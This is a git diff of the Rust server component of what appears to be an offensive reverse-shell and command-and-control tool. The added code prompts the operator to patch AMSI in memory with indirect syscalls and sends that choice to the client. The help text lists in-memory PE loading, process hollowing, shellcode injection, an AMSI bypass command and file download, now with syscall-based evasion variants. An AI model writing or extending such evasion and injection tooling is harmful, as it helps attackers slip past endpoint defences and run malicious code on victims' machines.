@@ -308,6 +308,7 @@ pub fn server(i: &str, port: u16, cert_path: &str, cert_pass: &str) -> Result<()
                                 print!("Do you want to patch the AMSI in memory or not ? [Y/N] ");
                                 io::stdout().flush().unwrap();
                                 let mut amsi = String::new();
+                                let mut syscalls_value = String::new();
                                 io::stdin().read_line(&mut amsi).expect("[-] Input issue");
                                 if !amsi
                                     .trim_end_matches('\0')
@@ -316,10 +317,27 @@ pub fn server(i: &str, port: u16, cert_path: &str, cert_pass: &str) -> Result<()
                                 {
                                     log::info!("[+] Starting PowerShell without patching the AMSI, please wait...");
                                 } else {
-                                    log::info!("[+] Starting PowerShell and patching the AMSI, please wait...");
+                                    print!("Do you want to use indirect syscalls ? [Y/N] ");
+                                    io::stdout().flush().unwrap();
+                                    io::stdin()
+                                        .read_line(&mut syscalls_value)
+                                        .expect("[-] Input issue");
+                                    if !syscalls_value
+                                        .trim_end_matches('\0')
+                                        .trim_end()
+                                        .eq_ignore_ascii_case("Y")
+                                    {
+                                        log::info!("[+] Starting PowerShell and patching the AMSI without indirect syscalls, please wait...");
+                                    } else {
+                                        log::info!("[+] Starting PowerShell and patching the AMSI with indirect syscalls, please wait...");
+                                    }
                                 }
                                 match stream.write(
-                                    (cmd.trim_end_matches('\0').to_owned() + ":" + &amsi)
+                                    (cmd.trim_end_matches('\0').to_owned()
+                                        + ":"
+                                        + &amsi
+                                        + ":"
+                                        + &syscalls_value)
                                         .as_bytes(),
                                 ) {
                                     Ok(_) => (),
@@ -463,15 +481,23 @@ fn help() -> String {
 
     [+] Loading commands
     > load C:\\path\\to\\PE_to_load
-        load a PE file in the client process memory and executes it. This could kill the reverse shell !
+        load a PE file in the client process memory and executes it. This will kill the reverse shell !
     > load -h C:\\path\\to\\PE_to_load C:\\path\\to\\PE_to_hollow
         load a PE file in a remote process memory with process hollowing and executes it
     > load -s C:\\path\\to\\shellcode.bin C:\\path\\to\\PE_to_execute
         load a shellcode in a remote process memory and start a new thread with it
 
+    [+] Loading commands with indirect syscalls
+    > syscalls C:\\path\\to\\PE_to_load
+        load a PE file in the client process memory and executes it, with indirect syscalls. This will kill the reverse shell !
+    > syscalls -h C:\\path\\to\\PE_to_load C:\\path\\to\\PE_to_hollow
+        load a PE file in a remote process memory with process hollowing and executes it, with indirect syscalls
+    > syscalls -s C:\\path\\to\\shellcode.bin C:\\path\\to\\PE_to_execute
+        load a shellcode in a remote process memory and start a new thread with it, with indirect syscalls
+
     [+] Bypass commands
     > powpow
-        start a new interactive PowerShell session with the AMSI patched in memory
+        start a new interactive PowerShell session with the AMSI patched in memory, with or without indirect syscalls
 
     [+] Network commands
     > download C:\\file\\to\\download C:\\local\\path
